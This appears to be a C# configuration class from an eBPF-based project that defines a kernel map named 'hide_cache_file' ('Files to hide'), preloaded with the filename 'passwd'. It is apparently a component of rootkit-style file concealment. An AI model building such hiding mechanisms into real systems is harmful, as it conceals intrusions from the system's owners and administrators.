using System.Collections.ObjectModel;
using Deamon.Ebpf.Abstraction;
using Deamon.Ebpf.Config;
using Deamon.Ebpf.Utils;
using Deamon.Utils;
using Mango.Interops;

namespace Deamon.Ebpf.Mapping;

internal sealed class MapCacheHideFile() : BaseMapConfig(BpfMapType.Hash, new EbpfMapTypeObj(Key:typeof(string), Val:typeof(byte)))
{
    private static readonly ReadOnlyCollection<string> filenames = ["passwd"]; //use other.

    public override string Name => "hide_cache_file";

    public override string Description => "Files to hide";

    public override IReadOnlyDictionary<byte[], byte[]> AddDefaultKeyValuesOnLoad()
        => filenames.ToDictionary(str => StrUtils.ToFixedKeySize(str, EbpfConstant.DnameMaxBytes), str => EbpfUtils.ToBytes((byte)1));
}